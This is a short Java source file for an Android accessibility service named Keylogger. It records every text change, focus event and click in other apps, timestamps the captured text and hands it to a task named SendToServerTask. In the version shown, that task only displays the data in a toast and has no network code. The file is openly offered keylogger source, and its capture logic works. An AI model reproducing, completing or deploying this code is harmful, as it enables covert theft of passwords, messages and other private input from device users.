package com.appsinventiv.keylogger;

import android.accessibilityservice.AccessibilityService;
import android.os.AsyncTask;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Locale;

import static java.net.Proxy.Type.HTTP;

public class Keylogger extends AccessibilityService {

    private StringBuilder content;
    private String data;

    private class SendToServerTask extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {

            data = data.replace("[", "").replace("]", "");
            CommonUtils.showToast(data);


            return params[0];
        }
    }

    @Override
    public void onServiceConnected() {
        Log.d("Keylogger", "Starting service");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        DateFormat df = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US);
        String time = df.format(Calendar.getInstance().getTime());

        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(TEXT)|" + data);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(FOCUSED)|" + data);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(CLICKED)|" + data);
                break;
            }
            default:
                break;
        }
    }

    @Override
    public void onInterrupt() {

    }
}
